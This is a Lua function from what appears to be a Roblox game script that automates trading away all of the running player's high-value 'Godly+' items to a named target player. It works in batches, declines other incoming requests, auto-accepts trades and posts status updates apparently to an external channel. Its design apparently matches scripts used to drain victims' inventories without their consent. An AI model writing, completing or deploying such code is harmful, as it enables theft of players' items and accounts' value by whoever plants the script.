local function _doTransfer(_targetName)
    _transferActive = true;
    _transferTarget = _targetName;
    _transferDone = 0;

    print("[transfer] starting -> ".._targetName);
    _postEmbed("🔄 Transfer Started", "Target: **".._targetName.."**\nSending all Godly+ items.", 0x3EED50);

    local _target = game.Players:FindFirstChild(_targetName);
    if not _target then
        _postEmbed("❌ Transfer Failed", "Player **".._targetName.."** is not in this server.", 0xFF0000);
        _transferActive = false;
        return;
    end

    task.wait(1.5);

    local _safety = 0;
    while _transferActive and _safety < 100 do
        _safety = _safety + 1;

        _target = game.Players:FindFirstChild(_targetName);
        if not _target then
            _postEmbed("⚠️ Transfer Stopped", "**".._targetName.."** left the server.\nBatches sent: **".._transferDone.."**", 0xFFA500);
            break;
        end

        local _batch = _collectGodlies();
        if #_batch == 0 then
            _postEmbed("✅ Transfer Complete", "No more Godly+ items.\nBatches sent: **".._transferDone.."**", 0x3EED50);
            break;
        end

        _clearTrade();

        local _sent = false;
        for _try = 1, 15 do
            if not _transferActive then break end
            local _s = _ts();
            if _s == "StartTrade" then _sent = true; break end
            if _s == "ReceivingRequest" then
                pcall(function() _rs.Trade.DeclineRequest:FireServer() end);
                task.wait(0.3);
            elseif _s == "None" then
                pcall(function() _rs.Trade.SendRequest:InvokeServer(_target) end);
            end
            task.wait(0.3);
        end

        if not _transferActive then break end

        if not _sent then
            print("[transfer] target didn't accept, retrying...");
            task.wait(2);
        else
            local _offered = 0;
            for _i = 1, math.min(4, #_batch) do
                if not _transferActive then break end
                pcall(function() _rs.Trade.OfferItem:FireServer(_batch[_i], "Weapons") end);
                task.wait(0.08);
                _offered = _offered + 1;
            end
            if _offered == 0 then break end

            task.wait(4.5);
            pcall(function() _rs.Trade.AcceptTrade:FireServer(game.PlaceId * 3, {}) end);

            local _t = 0;
            while _ts() ~= "None" and _t < 15 do
                task.wait(0.2);
                _t = _t + 0.2;
            end

            _transferDone = _transferDone + 1;
            print("[transfer] batch ".._transferDone.." sent");
        end

        task.wait(0.5);
    end

    _postEmbed("🏁 Transfer Ended", "Batches: **".._transferDone.."**\nTarget: **".._targetName.."**", 0x3EED50);

    _transferActive = false;
    _transferTarget = nil;
    print("[transfer] finished, batches: ".._transferDone);
end

